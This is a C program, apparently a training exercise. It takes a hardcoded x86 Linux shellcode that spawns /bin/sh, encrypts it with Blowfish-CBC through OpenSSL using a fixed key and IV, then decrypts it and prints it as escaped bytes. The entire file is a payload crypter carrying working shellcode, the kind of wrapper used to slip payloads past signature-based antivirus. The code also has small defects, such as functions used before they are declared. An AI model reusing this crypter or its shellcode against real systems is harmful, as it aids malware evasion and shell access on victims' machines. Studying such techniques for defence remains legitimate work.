#include <openssl/conf.h>
#include <openssl/evp.h>
#include <openssl/err.h>
#include <string.h>

void print_shellcode(unsigned char *shellcode) {
    size_t len = strlen(shellcode);
    int i;

    for (i = 0; i < len; i++) {
        printf("\\x%02x", *(shellcode + i));
    }

    printf("\n\n");
}

int main(int argc, char *argv[]) {
    // 256 bit key
    unsigned char *key = "4a9014eb30e5da0a8ea427b662f1cd3d";

    // 128 bit IV
    unsigned char *iv = "01234567890123456";

    // Unencrypted shellcode
    unsigned char *plaintext =  "\x31\xc0\x50\x68\x2f\x2f\x73"
                                "\x68\x68\x2f\x62\x69\x6e\x89"
                                "\xe3\x89\xc1\x89\xc2\xb0\x0b"
                                "\xcd\x80\x31\xc0\x40\xcd\x80";

    // Buffer for ciphertext (longer than the plaintext shellcode)
    unsigned char ciphertext[128];

    // Buffer for the decrypted text
    unsigned char decrypted_text[128];

    int decrypted_len, encrypted_len;

    // Initialize the library
    ERR_load_crypto_strings();
    OpenSSL_add_all_algorithms();
    OPENSSL_config(NULL);

    // Encrypt the plaintext
    encrypted_len = encrypt(plaintext, strlen(plaintext), key, iv,
                            ciphertext);

    printf("Ciphertext is:\n");
    BIO_dump_fp(stdout, ciphertext, encrypted_len);
    printf("\n");

    // Decrypt the ciphertext
    decrypted_len = decrypt(ciphertext, encrypted_len, key, iv,
                            decrypted_text);

    decrypted_text[decrypted_len] = '\0';

    printf("Decrypted text is:\n");
    print_shellcode(decrypted_text);

    // Compare decrypt(encrypt(plaintext)) result to the original plaintext.
    if (strcmp(plaintext, decrypted_text) != 0) {
        printf("The decrypted shellcode does not match the plaintext.\n\n");
    } else {
        printf("The decrypted shellcode matches the plaintext.\n\n");
    } 

    // Cleanup
    EVP_cleanup();
    ERR_free_strings();

    return 0;
}

void handleErrors(void) {
    ERR_print_errors_fp(stderr);
    abort();
}

int encrypt(unsigned char *plaintext, int plaintext_len, unsigned char *key,
    unsigned char *iv, unsigned char *ciphertext) {
    EVP_CIPHER_CTX *ctx;
    int len;
    int ciphertext_len;

    // Create context
    if (! (ctx = EVP_CIPHER_CTX_new())) {
        handleErrors();
    }

    // Initialize encryption
    if (EVP_EncryptInit_ex(ctx, EVP_bf_cbc(), NULL, key, iv) != 1) {
        handleErrors();
    }

    // Encrypt the message
    if (EVP_EncryptUpdate(ctx, ciphertext, &len, plaintext, plaintext_len) != 1) {
        handleErrors();
    }

    ciphertext_len = len;

    // Finalize encryption
    if (EVP_EncryptFinal_ex(ctx, ciphertext + len, &len) != 1) {
        handleErrors();
    }

    ciphertext_len += len;

    // Cleanup
    EVP_CIPHER_CTX_free(ctx);

    return ciphertext_len;
}

int decrypt(unsigned char *ciphertext, int ciphertext_len, unsigned char *key,
    unsigned char *iv, unsigned char *plaintext) {
    EVP_CIPHER_CTX *ctx;
    int len;
    int plaintext_len;

    // Create context
    if (! (ctx = EVP_CIPHER_CTX_new())) {
        handleErrors();
    }

    // Initialize decryption
    if (EVP_DecryptInit_ex(ctx, EVP_bf_cbc(), NULL, key, iv) != 1) {
        handleErrors();
    }

    // Decrypt the message
    if (EVP_DecryptUpdate(ctx, plaintext, &len, ciphertext, ciphertext_len) != 1) {
        handleErrors();
    }

    plaintext_len = len;

    // Finalize decryption
    if (EVP_DecryptFinal_ex(ctx, plaintext + len, &len) != 1) {
        handleErrors();
    }

    plaintext_len += len;

    // Cleanup
    EVP_CIPHER_CTX_free(ctx);

    return plaintext_len;
}
